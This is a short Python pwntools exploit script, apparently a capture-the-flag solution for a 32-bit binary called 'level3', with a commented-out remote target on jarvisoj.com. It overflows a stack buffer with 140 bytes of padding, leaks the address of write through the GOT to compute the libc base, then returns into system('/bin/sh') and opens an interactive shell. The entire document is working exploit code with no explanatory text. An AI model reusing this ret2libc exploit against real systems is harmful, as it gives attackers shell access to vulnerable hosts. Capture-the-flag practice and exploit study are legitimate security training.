from pwn import *

p = process('./level3')
# p = remote('pwn2.jarvisoj.com',9879)
elf = ELF('./level3')
# libc = ELF('./libc-2.19.so')
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

cnt = 140
vul_func = 0x0804844b

p.recv()
payload1 = 'a'*cnt + p32(elf.symbols['write']) + p32(vul_func) 
payload1 += p32(1) + p32(elf.got['write']) + p32(4)

p.sendline(payload1)
write_addr = u32(p.recv(4))
print "write_addr: "+hex(write_addr)

libc_base = write_addr - libc.symbols['write']
log.success("libc_base:"+hex(libc_base))

system_addr = libc_base + libc.symbols['system']
print "system_addr: " + hex(system_addr)

bin_addr = libc_base + libc.search('/bin/sh').next()

print "bin_addr: "+hex(bin_addr)
payload2 = 'a'*cnt + p32(system_addr) + p32(vul_func) + p32(bin_addr)
p.sendline(payload2)

p.interactive()